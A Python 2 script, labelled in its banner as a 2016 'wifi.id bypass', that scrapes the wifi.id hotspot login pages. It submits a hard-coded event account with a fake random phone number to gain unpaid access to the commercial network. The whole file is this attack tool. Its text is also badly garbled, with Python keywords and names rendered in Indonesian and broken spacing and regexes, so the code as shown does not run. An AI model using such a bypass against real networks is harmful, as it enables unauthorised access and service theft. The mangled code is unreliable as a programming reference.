impor os
impor mekanis
impor urllib
impor urllib2
impor ulang
impor json

def  rand_gen_phone ():
	phone =  ' 081 '
	untuk saya dalam  kisaran ( 9 ):
		phone + =  str (random.randint ( 0 , 9 ))
	telepon kembali

 spanduk def ():
	kembalikan  "" "
	   _____ .__ _____.__ .__ .___
	  / ___ \ __ _ _ | __ | / ____ \ __ | | __ | __ | _ /
	 / / ._ \ \ \ / \ / / \ __ \ | | | | / __ |
	<\ _____ / \ / | || | | | | / / _ / |
	 \ _____ \ \ / \ _ / | __ || __ | | __ | / \ __ \ ____ |
	                                \ / \ / 
    hak cipta (c) 2016 - @ wifi.id bypass by snoww0lf.
	"" "

def  web_start ():
	url =  " http://detik.com "
	browser = mechanize.Browser ()
	browser.set_handle_robots ( False )
	resp = browser.open (url) .read ()	
	store = resp
	parse_urls = re.findall ( r ' <li> ( . * ) </li> ' , simpan) [ 1 ]
	temp = parse_urls
	parse_url = re.findall ( r ' <a href=" (. *) "> ' , temp) [ 0 ]
	return  " http://welcome2.wifi.id/wifi.id-new/default/ "  + parse_url	

def  main ():
	coba :
		spanduk cetak ()
		url_input = web_start ()
		check =  " http://welcome2.wifi.id/wifi.id-new/default/?gw_id= "
		jika url_input.startswith (centang):
			get_url (url_input)
		lain :
			print  " [x] Terjadi kesalahan! [x] "
	kecuali  Pengecualian , e:
		cetak  " [-] Kesalahan -> % s [-] "  % (e)
	kecuali  KeyboardInterrupt :
		cetak  " [x] Dibatalkan [x] "

def  get_url ( url_input ):
	url =  " http://welcome2.wifi.id/wifi.id-new/default/melon.php "
	browser = mechanize.Browser ()
	browser.set_handle_robots ( False )
	browser.addheaders = [( ' Agen-pengguna ' , ' Mozilla / 5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build / IML74K) AppleWebkit / 534.30 (KHTML, seperti Gecko) Versi / 4.0 Mobile Safari / 534.30 ' )]
	resp = browser.open (url_input) .read ()
	store = resp
	parse_url = re.findall ( r '<a href="melon php (*) </a>?. ' , toko) [ 0 ] .split () [ 0 ] [: - 2 ]
	process_input (url + parse_url)

def  process_input ( url ):
	final_url =  " http://welcome2.wifi.id/authnew/login/check_login.php? "
	browser = mechanize.Browser ()
	browser.set_handle_robots ( False )
	browser.addheaders = [( ' Agen-pengguna ' , ' Mozilla / 5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build / IML74K) AppleWebkit / 534.30 (KHTML, seperti Gecko) Versi / 4.0 Mobile Safari / 534.30 ' )]
	resp = browser.open (url) .read ()
	store = resp
	parse_url = re.findall ( r ' https: // ( . * ) ' , store) [ 1 ] [: - 8 ]
	params = {
		' username_ ' : ' melon ' ,
		' nama pengguna ' : ' melon.melon@event ' ,
		' kata sandi ' : ' melon ' ,
		' landURL ' : ' https: // '  + parse_url +  str (rand_gen_phone)
	}
	split_url = url.split ( " & " )
	mac =  ' ' .join (split_url [ 0 ]). split ( " ? " )
	f_url = final_url + split_url [ 1 ] +  " & "  + split_url [ 2 ] +  " & "  + mac [ 1 ]
	header = { ' User-Agent ' : ' Mozilla / 5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build / IML74K) AppleWebkit / 534.30 (KHTML, seperti Gecko) Versi / 4.0 Mobile Safari / 534.30 ' }
	urenc = urllib.urlencode (params)
	req = urllib2.Request (f_url, urenc, header = header)
	res = urllib2.urlopen (req)
	output = json.loads (res.read ())
	cetak  " [+] Status: % s [+] "  % (keluaran [ ' pesan ' ])

if  __name__  ==  ' __main__ ' :
	utama()
